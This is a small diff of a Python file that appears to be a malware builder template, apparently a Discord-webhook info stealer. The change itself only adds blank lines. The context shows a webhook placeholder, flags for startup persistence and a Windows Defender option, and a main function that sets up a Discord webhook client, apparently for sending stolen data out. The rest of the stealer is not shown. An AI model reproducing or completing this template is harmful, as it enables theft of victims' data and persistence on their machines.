@@ -21,12 +21,16 @@ from sys import argv
 from tempfile import gettempdir, mkdtemp
 from zipfile import ZIP_DEFLATED, ZipFile
 
+
+
 __WEBHOOK_HERE__ = "YOUR WEBHOOK HERE"
 __PING__ = "%ping_enabled%"
 __PINGTYPE__ = "%ping_type%"
 __ERROR__ = "%_error_enabled%"
 __STARTUP__ = "%_startup_enabled%"
 __DEFENDER__ = "%_defender_enabled%"
+
+
 
 def main(webhook: str):
     webhook = SyncWebhook.from_url(webhook, session=requests.Session())
